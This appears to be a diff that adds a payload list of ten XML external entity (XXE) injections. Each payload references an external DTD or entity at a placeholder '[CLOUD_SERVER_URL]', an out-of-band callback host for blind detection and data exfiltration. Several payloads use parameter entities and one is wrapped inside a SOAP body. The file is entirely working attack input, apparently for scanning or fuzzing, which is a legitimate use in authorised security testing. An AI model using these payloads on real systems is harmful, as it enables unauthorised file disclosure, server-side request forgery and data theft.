@@ -1,0 +1,10 @@
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM "[CLOUD_SERVER_URL]" > %xxe; ]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[ <!ENTITY % pe SYSTEM "[CLOUD_SERVER_URL]">%pe; ]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" ><foo>&data;</foo>'
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" >
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "[CLOUD_SERVER_URL]" ><foo>&data;</foo>
+<?xml version="1.0" ?><!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY sp SYSTEM "[CLOUD_SERVER_URL]"> ]><r>&sp;</r>
+<!DOCTYPE test SYSTEM "[CLOUD_SERVER_URL]">
+<!ENTITY a SYSTEM "[CLOUD_SERVER_URL]" >
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "[CLOUD_SERVER_URL]"> %dtd;]><xxx/>]]></foo></soap:Body>
